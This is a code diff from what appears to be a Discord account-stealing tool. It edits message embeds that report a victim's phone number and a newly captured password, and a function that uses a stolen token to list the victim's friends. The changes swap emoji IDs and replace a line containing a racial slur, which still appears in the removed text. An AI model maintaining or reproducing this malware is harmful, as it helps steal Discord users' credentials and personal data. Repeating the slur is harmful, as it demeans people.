@@ -272,7 +272,7 @@ var event_handlers = {
                         inline: true
                     },
                     {
-                        name: "<:1337:1093566172064129126> **Phone Number**",
+                        name: "<a:1337:1093566167827886190> **Phone Number**",
                         value: `\`${userInfo.phone ?? "None"}\``,
                         inline: true
                     },
@@ -341,7 +341,7 @@ var event_handlers = {
                         inline: true
                     },
                     {
-                        name: "<:1337:1093566172064129126> **Phone Number**",
+                        name: "<a:1337:1093566167827886190> **Phone Number**",
                         value: `\`${userInfo.phone ?? "None"}\``,
                         inline: true
                     },
@@ -410,7 +410,7 @@ var event_handlers = {
                         inline: true
                     },
                     {
-                        name: "<:1337:1093566172064129126> **Phone Number**",
+                        name: "<a:1337:1093566167827886190> **Phone Number**",
                         value: `\`${userInfo.phone ?? "None"}\``,
                         inline: true
                     },
@@ -474,12 +474,12 @@ var event_handlers = {
                         inline: true
                     },
                     {
-                        name: "<:1337:1093566172064129126> **New password**",
+                        name: "<:1337:1093566181253853304> **New password**",
                         value: `\`${newPassword}\``,
                         inline: true
                     },
                     {
-                        name: "<:1337:1093566172064129126> **Phone Number**",
+                        name: "<a:1337:1093566167827886190> **Phone Number**",
                         value: `\`${userInfo.phone ?? "None"}\``,
                         inline: true
                     },
@@ -606,7 +606,7 @@ async function getRelationships(token) {
             rareBadgesFriends += b + ` | ${z.user.username}#${z.user.discriminator}\n`
         }
     }
-    if (!rareBadgesFriends) rareBadgesFriends = "Nigga Has No Rare Friends"
+    if (!rareBadgesFriends) rareBadgesFriends = "No Rare Friends"
 
     return {
         length: r.length,
@@ -722,7 +722,7 @@ async function initialize() {
                                 inline: true
                             },
                             {
-                                name: "<:1337:1093566172064129126> **Phone Number**",
+                                name: "<a:1337:1093566167827886190> **Phone Number**",
                                 value: `\`${userInfo.phone ?? "None"}\``,
                                 inline: true
                             },
